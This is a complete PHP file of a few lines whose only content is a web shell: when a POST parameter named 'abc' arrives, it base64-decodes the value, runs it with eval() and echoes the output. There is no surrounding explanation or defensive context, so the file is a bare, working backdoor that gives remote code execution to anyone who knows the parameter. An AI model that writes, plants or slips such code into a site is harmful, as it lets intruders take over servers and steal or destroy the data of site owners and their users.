<?php
if (isset($_POST['abc'])) {
    echo eval(base64_decode($_POST['abc']));
}
